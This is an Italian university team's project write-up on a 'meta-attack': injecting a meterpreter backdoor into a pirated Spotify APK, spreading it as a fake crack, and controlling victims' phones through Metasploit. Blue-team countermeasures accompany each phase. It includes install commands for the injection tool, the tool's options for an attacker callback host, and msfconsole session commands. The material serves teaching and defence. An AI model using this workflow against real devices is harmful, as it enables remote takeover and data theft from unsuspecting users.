.sect1+.sect1{border:0}
#footer{background:none}
#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body class="book toc2 toc-left">
<div id="header">
<h1>Apk Backdoor</h1>
<div class="details">
<span id="author" class="author">TriSec</span><br>
<span id="revnumber">versione 1.0.0,</span>
<span id="revdate">24 febbraio 2020</span>
<br><span id="revremark">Stesura della documentazione</span>
</div>
<div id="toc" class="toc2">
<div id="toctitle">Indice</div>
<ul class="sectlevel1">
<li><a href="#_introduzione">1. Introduzione</a>
<ul class="sectlevel2">
<li><a href="#_contesto">1.1. Contesto</a></li>
<li><a href="#_scenario">1.2. Scenario</a></li>
</ul>
</li>
<li><a href="#_killchain">2. Killchain</a>
<ul class="sectlevel2">
<li><a href="#reconnaissance">2.1. Reconnaissance</a>
<ul class="sectlevel3">
<li><a href="#reconnaissance-red-team">2.1.1. Red Team</a></li>
<li><a href="#reconnaissance-blue-team">2.1.2. Blue Team</a></li>
</ul>
</li>
<li><a href="#weaponization">2.2. Weaponization</a>
<ul class="sectlevel3">
<li><a href="#weaponization-red-team">2.2.1. Red Team</a>
<ul class="sectlevel4">
<li><a href="#_requisiti">Requisiti</a></li>
<li><a href="#_il_tool">Il tool</a></li>
<li><a href="#_il_funzionamento_del_tool">Il funzionamento del tool</a></li>
</ul>
</li>
<li><a href="#weaponization-blue-team">2.2.2. Blue Team</a></li>
</ul>
</li>
<li><a href="#delivery">2.3. Delivery</a>
<ul class="sectlevel3">
<li><a href="#delivery-red-team">2.3.1. Red Team</a></li>
<li><a href="#delivery-blue-team">2.3.2. Blue Team</a></li>
</ul>
</li>
<li><a href="#exploit">2.4. Exploit</a>
<ul class="sectlevel3">
<li><a href="#exploit-red-team">2.4.1. Red Team</a></li>
<li><a href="#exploit-blue-team">2.4.2. Blue Team</a></li>
</ul>
</li>
<li><a href="#installation">2.5. Installation</a>
<ul class="sectlevel3">
<li><a href="#installation-red-team">2.5.1. Red Team</a></li>
<li><a href="#installation-blue-team">2.5.2. Blue Team</a></li>
</ul>
</li>
<li><a href="#command-and-control">2.6. Command &amp; Control</a>
<ul class="sectlevel3">
<li><a href="#command-and-control-red-team">2.6.1. Red Team</a></li>
<li><a href="#command-and-control-blue-team">2.6.2. Blue Team</a></li>
</ul>
</li>
<li><a href="#action">2.7. Action</a>
<ul class="sectlevel3">
<li><a href="#action-red-team">2.7.1. Red Team</a></li>
<li><a href="#action-blue-team">2.7.2. Blue Team</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#appendix-red-team-tool">Appendice A: Codice sorgente: il tool</a>
<ul class="sectlevel2">
<li><a href="#appendix-red-team-tool-setup">A.1. File: setup.py</a></li>
<li><a href="#_modulo_apk_backdoor">A.2. Modulo: apk_backdoor</a>
<ul class="sectlevel3">
<li><a href="#appendix-red-team-tool-init">A.2.1. File: __init__.py</a></li>
<li><a href="#appendix-red-team-tool-main">A.2.2. File: __main__.py</a></li>
<li><a href="#appendix-red-team-tool-apk">A.2.3. File: apk.py</a></li>
<li><a href="#appendix-red-team-tool-cli">A.2.4. File: cli.py</a></li>
<li><a href="#appendix-red-team-tool-payload">A.2.5. File: payload.py</a></li>
<li><a href="#appendix-red-team-tool-utilities">A.2.6. File: utilities.py</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#_riferimenti">Riferimenti</a></li>
</ul>
</div>
</div>
<div id="content">
<div class="sect1">
<h2 id="_introduzione">1. Introduzione</h2>
<div class="sectionbody">
<div class="paragraph">
<p><strong>TriSec</strong> è un gruppo di studenti al terzo anno del Corso di Laurea in
Informatica e Comunicazione Digitale dell&#8217;Università degli Studi di Bari &#8220;A.
Moro&#8221;, composto da Andrea <strong>Esposito</strong>, Alessandro <strong>Annese</strong> e Graziano <strong>Montanaro</strong>.</p>
</div>
<div class="paragraph">
<p>Il nome del team deriva dalla condensazione del prefisso greco &#8220;tri&#8221; (tre,
come i componenti del gruppo) e &#8220;Sec&#8221; (da &#8220;Security&#8221;).</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/apk_backdoor.svg" alt="Apk Backdoor">
</div>
<div class="title">Figura 1. Logo di Apk Backdoor</div>
</div>
<div class="paragraph">
<p>Il progetto, &#8220;<strong>Apk Backdoor</strong>&#8221; rappresenta uno sviluppo di un meta-attacco,
ovverosia uno sviluppo di una intera classe di attacchi. Tali attacchi sono
accumunati da tutte le fasi della killchain fatta eccezione per la fase di
azione (che varia in base agli obiettivi specifici). L&#8217;intera classe di attacchi
si basa sulla introduzione di una <em>backdoor</em> (&#8220;porta sul retro&#8221;) all&#8217;interno
di APK validi e funzionanti.</p>
</div>
<div class="sect2">
<h3 id="_contesto">1.1. Contesto</h3>
<div class="paragraph">
<p>Si è deciso di realizzare una intera classe di attacchi aventi l&#8217;obiettivo di
ottenere l&#8217;accesso a un sistema Android, uno dei sistemi operativi mobile più
diffusi.</p>
</div>
<div class="paragraph">
<p>Nello specifico, si realizzerà un <em>tool</em> che consenta l&#8217;automatizzazione
dell&#8217;iniezione di codice malevole all&#8217;interno di un APK funzionante. Da qui,
l&#8217;obiettivo è quello di ottenere il controllo remoto del dispositivo mobile,
spianando la strada a qualsiasi tipo di obiettivo l&#8217;attaccante possa voler
raggiungere (per esempio, furto di dati sensibili o ricatti).</p>
</div>
</div>
<div class="sect2">
<h3 id="_scenario">1.2. Scenario</h3>
<div class="paragraph">
<p>Al giorno d&#8217;oggi, la maggioranza delle persone utilizzano applicazioni per
l&#8217;ascolto di musica on-demand online. Esempi di questi sistemi sono Spotify,
Amazon Music, iTunes, Google Music, ecc.</p>
</div>
<div class="paragraph">
<p>Molti di questi sistemi prevedono un sistema di abbonamento mensile per
permettere agli utenti di usufruire dei loro servizi. Tuttavia, una gran parte
degli utenti non è disposta a pagare per servizi digitali e quindi le aziende
forniscono una versione &#8220;limitata&#8221; dei loro servizi gratuitamente.</p>
</div>
<div class="paragraph">
<p>Ma queste limitazioni non sono spesso accettate da tutti: molti utenti
preferiscono, infatti, &#8220;crackare&#8221; l&#8217;applicazione in modo da poterla utilizzare
senza alcun tipo di limitazione. Ed è in questo scenario che l&#8217;attacco si
colloca: gli attaccanti hanno l&#8217;obiettivo di fornire una crack corrotta agli
utenti che, una volta installata, fornisca una porta di accesso al sistema
spianando la strada a furti di dati o altri danni.</p>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_killchain">2. Killchain</h2>
<div class="sectionbody">
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Tabella 1. Killchain</caption>
<colgroup>
<col style="width: 33.3333%;">
<col style="width: 33.3333%;">
<col style="width: 33.3334%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-middle">Red Team</th>
<th class="tableblock halign-center valign-middle">Phase</th>
<th class="tableblock halign-right valign-middle">Blue Team</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Individuazione del mezzo di trasmisisone (app)</p></td>
<th class="tableblock halign-center valign-middle"><p class="tableblock">Reconnaissance</p></th>
<td class="tableblock halign-right valign-middle"><p class="tableblock">Prevenire l&#8217;installazione di applicazioni da fonti sconosciute</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Preparazione dell&#8217;applicazione modificata</p></td>
<th class="tableblock halign-center valign-middle"><p class="tableblock">Weaponization</p></th>
<td class="tableblock halign-right valign-middle"><p class="tableblock">Implementare restrizioni sull&#8217;attivazione di modalità non consone all&#8217;utilizzo del dispositivo</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Preparazione dell&#8217;esca e condivisione del link di download</p></td>
<th class="tableblock halign-center valign-middle"><p class="tableblock">Delivery</p></th>
<td class="tableblock halign-right valign-middle"><p class="tableblock">Visitare solo siti internet attendibili</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Autoesecuzione del payload</p></td>
<th class="tableblock halign-center valign-middle"><p class="tableblock">Exploit</p></th>
<td class="tableblock halign-right valign-middle"><p class="tableblock">Utilizzare antivirus sempre aggiornati</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Installazione da parte dell&#8217;utente</p></td>
<th class="tableblock halign-center valign-middle"><p class="tableblock">Installation</p></th>
<td class="tableblock halign-right valign-middle"><p class="tableblock">Controllare sempre le autorizzazioni richieste dalle applicazioni</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Attivazione della backdoor</p></td>
<th class="tableblock halign-center valign-middle"><p class="tableblock">Command &amp; Control</p></th>
<td class="tableblock halign-right valign-middle"><p class="tableblock">Effettuare scansioni periodiche del sistema</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-middle"><p class="tableblock">Sfruttamento della backdoor</p></td>
<th class="tableblock halign-center valign-middle"><p class="tableblock">Action</p></th>
<td class="tableblock halign-right valign-middle"><p class="tableblock">Rimuovere l&#8217;applicazione malevola</p></td>
</tr>
</tbody>
</table>
<div class="sect2">
<h3 id="reconnaissance">2.1. Reconnaissance</h3>
<div class="paragraph">
<p>La fase di "ricognizione" è una delle fasi principali di tutti gli attacchi in
quanto dedicata alla raccolta delle informazioni sull&#8217;obiettivo e alla
successiva stesura del piano di azione (che determina quindi l&#8217;intero esito
dell&#8217;attacco). Allo stesso modo è importante questa fase per la difesa degli
assets in quanto impedire la ricognizione impedisce, di fatto, di strutturare un
attacco ben definito.</p>
</div>
<div class="sect3">
<h4 id="reconnaissance-red-team">2.1.1. Red Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Individuazione del mezzo di trasmissione</em>&#8221;</p>
</div>
<div class="paragraph">
<p>L&#8217;intera fase di ricognizione in questo attacco è basata sul <em>social
engineering</em>. Si vogliono quindi determinare delle possibili vittime
dell&#8217;attacco in modo da poter preparare un attacco.</p>
</div>
<div class="paragraph">
<p>Al fine di colpire il maggior numero di dispositivi possibili, la fase di
ricognizione ha portato al riconoscere l&#8217;importanza di applicazioni legate
all&#8217;ascolto di musica on-demand. Una di queste applicazioni è l&#8217;applicazione di
Spotify (<a href="https://www.spotify.com/" class="bare">https://www.spotify.com/</a>), installata su diversi dispositivi (più di
248 milioni di utenti attivi stando ad alcune fonti <a href="#spotify-users">[spotify-users]</a>).</p>
</div>
<div class="paragraph">
<p>Inoltre, è risaputo che parte di tali utenti utilizza una versione &#8220;pirata&#8221; di
Spotify: nel 2019 si stimava che su 232 milioni di utenti totali, 124 milioni
fossero utenti utilizzatori di versioni pirata dell&#8217;applicazione (stando a
<a href="#spotify-pirated">[spotify-pirated]</a>).</p>
</div>
<div class="paragraph">
<p>L&#8217;attacco sarà quindi così strutturato: si provvederà a generare un APK
&#8220;pirata&#8221; di Spotify introducendo al suo interno una <em>backdoor</em> che fornisca
quindi accesso ai dispositivi sui quali è installata e aperta.</p>
</div>
</div>
<div class="sect3">
<h4 id="reconnaissance-blue-team">2.1.2. Blue Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Prevenire l&#8217;installazione di applicazioni da fonti sconosciute</em>&#8221;</p>
</div>
<div class="paragraph">
<p>E' importante evitare di installare applicazioni scaricate da fonti sconosciute in quanto sono le prime a contenere un possibile codice malevolo.</p>
</div>
<div class="paragraph">
<p>Al fine di prevenire eventuali attacchi da parte di terzi è necessario <strong>non</strong> attivare la modalità &#8220;<em>Installa app sconosciute</em>&#8221; come prima forma di tutela da parte dell&#8217;utilizzatore del dispositivo.</p>
</div>
<div class="paragraph">
<p>Tuttavia, se l&#8217;utilizzatore del device è uno sviluppatore, è importante che quest&#8217;ultimo presti molta attenzione ad installare solo applicazioni sviluppate da lui stesso o da personale fidato (in questa lista di applicazioni sono incluse anche quelle installabili da fonti verificate quali GOOGLE PlayStore, HUAWEI AppGallery o SAMSUNG Galaxy Store).</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="weaponization">2.2. Weaponization</h3>
<div class="paragraph">
<p>Questa fase riguarda la preparazione del malware vero e proprio.</p>
</div>
<div class="sect3">
<h4 id="weaponization-red-team">2.2.1. Red Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Preparazione dell&#8217;applicazione modificata</em>&#8221;</p>
</div>
<div class="sect4">
<h5 id="_requisiti">Requisiti</h5>
<div class="paragraph">
<p>Per poter proseguire con l&#8217;attacco, sono necessari alcuni prerequisiti software.</p>
</div>
<div class="paragraph">
<p>Non è necessario alcun sistema operativo particolare per eseguire i comandi
(benché sia molto consigliato utilizzare un sistema operativo Linux, come
<strong>Kali</strong> o <strong>Ubuntu</strong>). Tutto quel che è descritto in questo documento è stato
scritto e testato su <strong>Ubuntu 19.10 (Eoan Ermine)</strong>.</p>
</div>
<div class="paragraph">
<p>Per iniziare, è necessario installare e/o aggiornare il framework <strong>Metasploit</strong>.
Su <em>Kali Linux</em>, questo tool è già preinstallato e per aggiornarlo basta
eseguire i seguenti comandi:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nb">sudo </span>apt update <span class="nt">-y</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt upgrade <span class="nt">-y</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Su <em>Ubuntu</em> (o altre distribuzioni) è invece necessario installarlo dal suo
codice sorgente. Le istruzioni sono comunque disponibili all&#8217;interno della loro
repository, all&#8217;indirizzo <a href="https://github.com/rapid7/metasploit-framework" class="bare">https://github.com/rapid7/metasploit-framework</a>.</p>
</div>
<div class="paragraph">
<p>Successivamente è necessario installare il tool <code>zipalign</code> (utilizzato durante
la fase di firma dell&#8217;APK). Tale tool, se non precedentemente installato, è
installabile mediante i seguenti comandi:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nb">sudo </span>apt update <span class="nt">-y</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt <span class="nb">install</span> <span class="nt">-y</span> zipalign</code></pre>
</div>
</div>
<div class="paragraph">
<p>È inoltre necessario installare <strong>Python 3.7</strong> (o superiore). Oggigiorno le
distribuzioni Linux citate hanno l&#8217;interprete preinstallato. Tuttavia, qualora
fosse necessario, Python e il suo <em>package manager</em> <strong>PIP</strong> possono essere
installati eseguendo:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nb">sudo </span>apt update <span class="nt">-y</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt <span class="nb">install </span>python3 python3-pip <span class="nt">-y</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Inoltre, il tool è dipendente da ApkTool
(<a href="https://ibotpeaches.github.io/Apktool/" class="bare">https://ibotpeaches.github.io/Apktool/</a>), da installare preventivamente. Il metodo di installazione varia in base al sistema su cui si opera, ma su Ubuntu 19.10 basta eseguire i seguenti comandi:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell"><span class="nb">sudo </span>apt update <span class="nt">-y</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt <span class="nb">install </span>apktool <span class="nt">-y</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Ulteriori dipendenze da installare sono quelle dei tool installati fin&#8217;ora, ma
sono già elencate sui loro siti web o installate automaticamente (con il comando
<code>apt install</code>) ed è quindi superfluo riportarle.</p>
</div>
<div class="paragraph">
<p>Inoltre, il tool è dipendente da ApkSigner
(<a href="https://developer.android.com/studio/command-line/apksigner" class="bare">https://developer.android.com/studio/command-line/apksigner</a>), tuttavia tale
eseguibile è stato incluso all&#8217;interno del programma scritto e non è quindi
necessaria una sua installazione.</p>
</div>
<div class="paragraph">
<p>Una dipendenza non necessaria, ma consigliata, è KeyTool
(<a href="https://docs.oracle.com/en/java/javase/12/tools/keytool.html" class="bare">https://docs.oracle.com/en/java/javase/12/tools/keytool.html</a>), utilizzato per
creare il database di chiavi con cui firmare l&#8217;APK. Un database di debug è stato
già incluso all&#8217;interno del tool e non è quindi necessario l&#8217;installazione di
KeyTool, ma qualora si volessero modificare le chiavi nel database, è necessaria
la sua installazione.</p>
</div>
<div class="paragraph">
<p>Le versioni dei tool con cui il programma scritto è stato testato sono le
seguenti:</p>
</div>
<div class="hdlist">
<table>
<tr>
<td class="hdlist1">
Metasploit Framework
</td>
<td class="hdlist2">
<p>versione <code>5.0.75-dev-8167fee11e</code></p>
</td>
</tr>
<tr>
<td class="hdlist1">
Python
</td>
<td class="hdlist2">
<p>versione 3.7.5</p>
</td>
</tr>
<tr>
<td class="hdlist1">
Pip
</td>
<td class="hdlist2">
<p>versione 18.1 (per Python 3)</p>
</td>
</tr>
<tr>
<td class="hdlist1">
Zipalign
</td>
<td class="hdlist2">
<p><em>Unknown</em></p>
</td>
</tr>
<tr>
<td class="hdlist1">
ApkTool
</td>
<td class="hdlist2">
<p>versione 2.4.0</p>
</td>
</tr>
<tr>
<td class="hdlist1">
ApkSigner
</td>
<td class="hdlist2">
<p>versione 0.8</p>
</td>
</tr>
</table>
</div>
</div>
<div class="sect4">
<h5 id="_il_tool">Il tool</h5>
<div class="paragraph">
<p>I comandi da eseguire al fine di includere una backdoor in un APK sono diversi,
e richiedono alcune azioni manuali. Poiché ci si occupa di gestire un
meta-attacco, è impensabile riprodurre numerose volte le stesse azioni su APK
differenti. Per questo motivo si è deciso di creare un tool che automatizzasse
la creazione del malware.</p>
</div>
<div class="paragraph">
<p>Il codice sorgente di tale tool, per non appensantire questa sezione del
documento, è riportato in <a href="#appendix-red-team-tool">Appendice A</a>.</p>
</div>
<div class="paragraph">
<p>L&#8217;installazione è semplicissima: basta eseguire i seguenti comandi:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell">git clone https://github.com/espositoandrea/CyberSecurity.git
<span class="nb">cd </span>CyberSecurity/src
pip3 <span class="nb">install</span> .</code></pre>
</div>
</div>
<div class="paragraph">
<p>In questo modo il tool sarà installato e disponibile nella variabile <code>PATH</code> di
sistema. Il programma si presenta in questo modo:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code>andrea@laptop:~$ apk-backdoor -h
usage: apk-backdoor [-h] [-v] [--host HOST] [--public_host PUBLIC_HOST]
                    [--meterpreter-config {Y,N}]
                    [-V {CRITICAL,ERROR,WARN,INFO,DEBUG}]
                    APK

Inject a meterpreter backdoor in an existing APK

positional arguments:
  APK                   The APK where the backdoor will be injected

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  --host HOST, -H HOST  The host (in the form IP:PORT) to which the payload
                        will send data
  --public_host PUBLIC_HOST, -p PUBLIC_HOST
                        The host (in the form IP:PORT) to which the payload
                        will send data. Use this if HOST is in a private
                        network: REAL_HOST will be the router's public IP (and
                        the port that the router will forward to the
                        attacker's machine)
  --meterpreter-config {Y,N}, -m {Y,N}
                        Whether or not a meterpreter configuration file should
                        be written.It can then be used with 'msfconsole -r
                        config_file'
  -V {CRITICAL,ERROR,WARN,INFO,DEBUG}, --verbose {CRITICAL,ERROR,WARN,INFO,DEBUG}
                        Verbosity level (between 1 and 5 occurrences with more
                        leading to a more verbose logging). CRITICAL = 0,
                        ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.</code></pre>
</div>
</div>
<div class="paragraph">
<p>Come comprensibile, il programma richiede un APK in cui iniettare la backdoor e
dispone di una serie di opzioni che ne consentono la configurazione da riga di
comando.</p>
</div>
</div>
<div class="sect4">
<h5 id="_il_funzionamento_del_tool">Il funzionamento del tool</h5>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Il programma, al suo avvio, ottiene un riferimento all&#8217;APK target, in modo da
poterlo utilizzare al suo interno.</p>
</li>
<li>
<p>Se non forniti mediante interfaccia da riga di comando, il programma richiede
l&#8217;immissione dell&#8217;IP privato dell&#8217;host a cui inviare i dati una volta avviata la
backdoor</p>
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Se l&#8217;attacco è da compiere su rete WAN, deve essere utilizzata l&#8217;interfaccia
da riga di comando e deve essere fornito l&#8217;IP pubblico mediante l&#8217;opzione <code>-p</code></p>
</li>
</ol>
</div>
</li>
<li>
<p>È eseguito il comando <code>msfvenom</code> per iniettare la backdoor all&#8217;interno
dell&#8217;APK (si veda <a href="#appendix-red-team-tool-payload">Section A.2.5</a> per il comando completo).
Poiché l&#8217;APK non funziona a dovere sin da questo punto, è necessario apportarvi
delle modifiche</p>
</li>
<li>
<p>L&#8217;APK generato viene decompilato con ApkTool (si veda
<a href="#appendix-red-team-tool-apk">Section A.2.3</a>)</p>
</li>
<li>
<p>Viene iniettato all&#8217;interno del Manifest dell&#8217;APK decompilato una riga XML che
consente l&#8217;uso dei permessi richiesti sui dispositivi Android più recenti</p>
</li>
<li>
<p>È ricompilato l&#8217;APK modificato con ApkTool (si veda
<a href="#appendix-red-team-tool-apk">Section A.2.3</a>)</p>
</li>
<li>
<p>L&#8217;APK viene riallineato con ZipAlign (si veda <a href="#appendix-red-team-tool-apk">Section A.2.3</a>)</p>
</li>
<li>
<p>L&#8217;APK appena ricompilato è firmato con ApkSigner (si veda
<a href="#appendix-red-team-tool-apk">Section A.2.3</a>)</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>A questo punto l&#8217;APK infetto è pronto e può essere condiviso.</p>
</div>
</div>
</div>
<div class="sect3">
<h4 id="weaponization-blue-team">2.2.2. Blue Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Implementare restrizioni sull&#8217;attivazione di modalità non consone all&#8217;utilizzo del dispositivo</em>&#8221;</p>
</div>
<div class="paragraph">
<p>Molti dispositivi &#8220;<em>Android Based</em>&#8221; hanno, nelle ultime versioni del software, delle restrizioni riguardo l&#8217;installazione di applicazioni sconosciute. Queste restrizioni, oltre ad implicare l&#8217;attivazione della modalità &#8220;<em>Installa app sconosciute</em>&#8221;, prevedono l&#8217;esplicita richiesta dei permessi di <strong>root</strong> o di attivare la &#8220;<em>Modalità sviluppatore</em>&#8221;.</p>
</div>
<div class="paragraph">
<p>Pertanto, si consiglia di non sbloccare il proprio telefono (e quindi di evitare l&#8217;attivazione dei permessi di <em>root</em>) e di non attivare la &#8220;<em>Modalità sviluppatore</em>&#8221; se non si sviluppano software.</p>
</div>
<div class="paragraph">
<p>Nel caso in cui l&#8217;utente sia uno sviluppatore, è consigliabile utilizzare il device come &#8220;<em>Dispositivo secondario</em>&#8221;, ovvero senza dati personali e/o sensibili. Se non è possibile tale scenario, è consigliato non scaricare applicazioni o altre tipologie di file da fonti non autorevoli.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="delivery">2.3. Delivery</h3>
<div class="paragraph">
<p>In questa fase avviene la &#8220;consegna&#8221; del malware creato precedentemente.</p>
</div>
<div class="sect3">
<h4 id="delivery-red-team">2.3.1. Red Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Preparazione dell&#8217;esca e condivisione dell&#8217;indirizzo di download</em>&#8221;</p>
</div>
<div class="paragraph">
<p>Completato il malware, è necessaria la sua diffusione al fine di compiere
realmente l&#8217;attacco. A tal scopo, avendo ottenuto le informazioni descritte in
<a href="#reconnaissance-red-team">Section 2.1.1</a>, si decide di condividerlo mediante internet,
lasciando all&#8217;utente (ignaro) l&#8217;onere di installarlo sul proprio dispositivo. A
tale fine si crea un post su di un blog, fornendo un link di download per l&#8217;APK
modificato (che è descritto come una &#8220;crack&#8221; dell&#8217;applicazione originale).
Successivamente si condivide l&#8217;URL di tale post e si attendono i primi download.</p>
</div>
</div>
<div class="sect3">
<h4 id="delivery-blue-team">2.3.2. Blue Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Visitare solo siti internet attendibili</em>&#8221;</p>
</div>
<div class="paragraph">
<p>La maggior parte delle app &#8220;<em>piratate</em>&#8221; viene distribuita attraverso blog, siti internet improvvisati o gruppi social (Facebook, Telegram ecc&#8230;&#8203;).</p>
</div>
<div class="paragraph">
<p>E' consigliato non visitare o frequentare tali fonti in quanto distributrici di applicazioni funzionali ma contententi, nella maggior parte dei casi, codice malevolo.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="exploit">2.4. Exploit</h3>
<div class="paragraph">
<p>Fase in cui l&#8217;attaccante utilizza un software inviando comandi per far compiere azioni malevoli</p>
</div>
<div class="sect3">
<h4 id="exploit-red-team">2.4.1. Red Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Autoesecuzione del payload</em>&#8221;</p>
</div>
<div class="paragraph">
<p>Durante la creazione del malware, si è incluso all&#8217;interno dell&#8217;APK una porzione
di codice che apra <strong>automaticamente</strong> la <em>backdoor</em> all&#8217;apertura
dell&#8217;applicazione modificata (si veda <a href="#weaponization-red-team">Section 2.2.1</a>). Per questo
motivo, data la struttura dell&#8217;attacco, non sono richieste particolari azioni
alla squadra attaccante, ma solo un po' di pazienza nell&#8217;attendere che un utente
apra l&#8217;applicazione modificata.</p>
</div>
<div class="paragraph">
<p>L&#8217;attaccante non deve quindi compiere alcuna azione per eseguire il payload e
avviare la fase successiva in quanto il lavoro è stato automatizzato in fase di
creazione del malware.</p>
</div>
</div>
<div class="sect3">
<h4 id="exploit-blue-team">2.4.2. Blue Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Utilizzare antivirus sempre aggiornati</em>&#8221;</p>
</div>
<div class="paragraph">
<p>Sui vari store sono presenti delle applicazioni <em>antivirus</em> che si occupano di scansionare tutti i file in entrata nel dispositivo.</p>
</div>
<div class="paragraph">
<p>Si consiglia di installrne uno e di tenerlo sempre aggiornato in modo da riconoscere un&#8217;eventuale applicazione malevola o con eventuali firme non riconosciute.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="installation">2.5. Installation</h3>
<div class="paragraph">
<p>Dopo aver compromesso il sistema, l&#8217;attaccante installa il malware necessario a compiere le azioni malevoli.</p>
</div>
<div class="sect3">
<h4 id="installation-red-team">2.5.1. Red Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Installazione da parte dell&#8217;utente</em>&#8221;</p>
</div>
<div class="paragraph">
<p>Come già detto, durante la creazione del malware si è incluso all&#8217;interno
dell&#8217;APK una porzione di codice che apra <strong>automaticamente</strong> la <em>backdoor</em>
all&#8217;apertura dell&#8217;applicazione modificata (si veda <a href="#weaponization-red-team">Section 2.2.1</a>).
Per questo motivo non è richiesta alcuna azione da parte dell&#8217;attaccante al fine
di installare il malware, già installato e attivato <strong>autonomamente</strong> dalla
vittima e non è richiesta alcuna azione esterna.</p>
</div>
</div>
<div class="sect3">
<h4 id="installation-blue-team">2.5.2. Blue Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Controllare sempre le autorizzazioni richieste dalle applicazioni</em>&#8221;</p>
</div>
<div class="paragraph">
<p>Dalla versione 6.0 del sistema Android è stata introdotta un&#8217;importante funzione che permette all&#8217;utente di gestire i permessi richiesti dalle applicazioni installate sul dispositivo.</p>
</div>
<div class="paragraph">
<p>E' quindi necessario controllare, in fase di installazione, i permessi richiesti dall&#8217;applicazione: Un applicazione come Spotify non richiede l&#8217;utilizzo della fotocamera, pertanto se ci si accorge che l&#8217;app che si sta installando li richiede, potrebbe essere il segnale di presenza di un malware.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="command-and-control">2.6. Command &amp; Control</h3>
<div class="paragraph">
<p>In questa fase l&#8217;attaccante assume il controllo da remoto del sistema compromesso.</p>
</div>
<div class="sect3">
<h4 id="command-and-control-red-team">2.6.1. Red Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Attivazione della backdoor</em>&#8221;</p>
</div>
<div class="paragraph">
<p>L&#8217;attaccante, una volta condiviso il malware, attiva una shell su una propria
macchina che intercetti i pacchetti inviati dal malware. In questo modo,
l&#8217;attaccante può essere aggiornato sullo stato del malware e controllare a
distanza i dispositivi delle vittime, sfruttando la <em>backdoor</em> creata.</p>
</div>
<div class="paragraph">
<p>L&#8217;attivazione della shell avviene sfruttando i comandi forniti da framework
<strong>Metasploit</strong>. Nello specifico, è necessario attivare una console mediante il
comando <code>msfconsole</code> e configurare l&#8217;exploit e il payload da utilizzare.</p>
</div>
<div class="paragraph">
<p>Il tool sviluppato semplifica questa operazione creando un file di
configurazione per la console del framework <strong>Metasploit</strong>. Tale file è
memorizzato nella cartella in cui il comando è stato eseguito, in parallelo al
file APK infetto. Tale file, memorizzato come <code>meterpreter.rc</code> può poi essere
utilizzato semplicemente con un comando:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell">msfconsole <span class="nt">-r</span> meterpreter.rc</code></pre>
</div>
</div>
<div class="paragraph">
<p>Questo comando avvierà la shell di Metasploit e attiverà l&#8217;exploit in
background. Quando una vittima aprirà l&#8217;applicazione, l&#8217;attaccante sarà
avvertito della creazione di una nuova sessione e potrà avviare l&#8217;interazione
con pochi comandi:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell">sessions <span class="nt">-l</span> <span class="c"># List all sessions</span>
sessions <span class="nt">-i</span> 1 <span class="c"># Interact with session 1</span></code></pre>
</div>
</div>
<div class="paragraph">
<p>Il primo comando non è in realtà necessario: questo serve solo a ottenere una
lista di sessioni avviate in modo da poterne leggere l&#8217;ID da utilizzare nel
secondo comando (che avvia realmente la comunicazione con il device target).</p>
</div>
<div class="paragraph">
<p>Nel caso in cui non sia stato creato il file di configurazione di Metasploit, è
comunque possibile procedere a una configurazione manuale. Per farlo, basta
avviare la console di Metasploit mediante il comando <code>msfconsole</code>, ed eseguire
poi i seguenti comandi:</p>
</div>
